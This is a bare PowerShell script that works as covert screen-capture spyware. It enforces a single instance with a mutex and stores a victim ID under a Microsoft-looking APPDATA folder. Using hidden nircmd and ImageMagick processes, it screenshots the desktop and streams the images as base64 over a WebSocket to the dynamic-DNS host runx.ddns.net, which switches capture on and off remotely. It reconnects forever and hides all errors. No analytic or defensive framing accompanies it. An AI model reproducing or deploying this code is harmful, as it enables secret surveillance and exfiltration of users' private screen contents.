if (!(Test-Path "$env:TEMP\run")) {
  $null = New-Item "$env:TEMP\run" -ItemType Directory
}

$mutex = New-Object System.Threading.Mutex($false, "ss_control")
if (-not $mutex.WaitOne(0)) {
  exit
}

$IdPath = "$env:APPDATA\Microsoft\run\run.txt"
if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()

  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
$UserFolder = Join-Path (Join-Path $env:TEMP "frames-repo") $uniqueUser
if (!(Test-Path $UserFolder)) {
  $null = New-Item $UserFolder -ItemType Directory
}

Add-Type -AssemblyName System.Drawing

$VPS_WS_URL = "ws://runx.ddns.net/ws/frames"

function Send-WebSocketMessage($ws, $cts, $text) {
  $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
  $segment = [System.ArraySegment[byte]]::new($bytes)
  $task = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token)
  $task.Wait()
}

function Capture-And-SendFrame($ws, $cts) {
  $Timestamp = Get-Date -Format "yyyyMMddHHmmssfff"
  $RawPath = Join-Path $UserFolder "raw_$Timestamp.png"
  $JpegPath = Join-Path $UserFolder "$Timestamp.jpg"

  Start-Process `
    -FilePath "$env:TEMP\run\nircmd\nircmd.exe" `
    -ArgumentList @(
    "savescreenshotfull",
    $RawPath
  ) -WindowStyle Hidden -Wait

  if (Test-Path $RawPath) {
    $MagickExe = "$env:TEMP\run\magick\magick.exe"
    $magickArgs = "`"$RawPath`" -colorspace gray -resize 50% -quality 80 `"$JpegPath`""

    Start-Process `
      -FilePath $MagickExe `
      -ArgumentList @(
      $magickArgs
    ) -WindowStyle Hidden -Wait

    Remove-Item $RawPath -Force
  }

  if (Test-Path $JpegPath) {
    $fileBytes = [System.IO.File]::ReadAllBytes($JpegPath)
    $base64Image = [Convert]::ToBase64String($fileBytes)
    $filename = (Get-Item $JpegPath).Name

    if ($ws -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
      try {
        $body = @{
          action = "upload_frame"
          username = $uniqueUser
          filename = $filename
          image = $base64Image
        } | ConvertTo-Json -Compress
        Send-WebSocketMessage -ws $ws -cts $cts -text $body
      } catch {}
    }

    Remove-Item $JpegPath -Force
  }
}

while ($true) {
  try {
    $ws = New-Object System.Net.WebSockets.ClientWebSocket
    $cts = New-Object System.Threading.CancellationTokenSource
    $wsUri = New-Object System.Uri("$VPS_WS_URL?username=$([System.Uri]::EscapeDataString($uniqueUser))")

    $connectTask = $ws.ConnectAsync($wsUri, $cts.Token)
    if ($connectTask.Wait(8000) -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
      $captureState = $false
      $recvBuf = New-Object byte[] 4096
      $segment = New-Object System.ArraySegment[byte] -ArgumentList (,$recvBuf)
      $recvTask = $null

      while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
        if ($null -eq $recvTask -or $recvTask.IsCompleted) {
          if ($recvTask -and $recvTask.IsCompleted -and -not $recvTask.IsFaulted) {
            $res = $recvTask.Result
            if ($res.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
              break
            }
            if ($res.Count -gt 0) {
              $jsonStr = [System.Text.Encoding]::UTF8.GetString($recvBuf, 0, $res.Count)
              try {
                $msg = $jsonStr | ConvertFrom-Json
                if ($msg.action -eq "set_capture") {
                  $captureState = [bool]$msg.capture
                }
              } catch {}
            }
          }
          if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            $recvTask = $ws.ReceiveAsync($segment, $cts.Token)
          }
        }

        if ($captureState) {
          Capture-And-SendFrame -ws $ws -cts $cts
        }

        Start-Sleep -Seconds 1
      }
    }
  } catch {}

  Start-Sleep -Seconds 1
}
